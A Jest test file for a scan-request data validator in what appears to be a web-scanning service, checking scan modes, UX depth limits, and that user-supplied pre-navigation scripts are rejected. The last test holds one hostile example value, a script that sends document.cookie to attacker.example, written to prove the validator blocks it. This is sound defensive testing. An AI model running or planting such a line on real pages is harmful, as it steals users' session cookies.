import 'reflect-metadata';
import { plainToInstance } from 'class-transformer';
import { validate } from 'class-validator';
import { CreateScanDto } from './create-scan.dto';

describe('CreateScanDto', () => {
  it('accepts a normal scan request without a pre-navigation script', async () => {
    const dto = plainToInstance(CreateScanDto, {
      projectId: 'project-1',
      urls: ['https://public.example'],
      scanMode: 'rapido',
      ux: 4,
    });

    await expect(validate(dto)).resolves.toHaveLength(0);
  });

  it('accepts the complete critical flow UX depth', async () => {
    const dto = plainToInstance(CreateScanDto, {
      projectId: 'project-1',
      urls: ['https://public.example'],
      scanMode: 'profundo',
      ux: 6,
    });

    await expect(validate(dto)).resolves.toHaveLength(0);
  });

  it('rejects unsupported UX depth values', async () => {
    const dto = plainToInstance(CreateScanDto, {
      projectId: 'project-1',
      urls: ['https://public.example'],
      scanMode: 'profundo',
      ux: 7,
    });

    const errors = await validate(dto);

    expect(errors.some((error) => error.property === 'ux')).toBe(true);
  });

  it('rejects user-controlled pre-navigation scripts', async () => {
    const dto = plainToInstance(CreateScanDto, {
      projectId: 'project-1',
      urls: ['https://public.example'],
      scanMode: 'rapido',
      ux: 4,
      preNavigationScript: 'fetch("https://attacker.example/" + document.cookie)',
    });

    const errors = await validate(dto);

    expect(errors.some((error) => error.property === 'preNavigationScript')).toBe(true);
  });
});
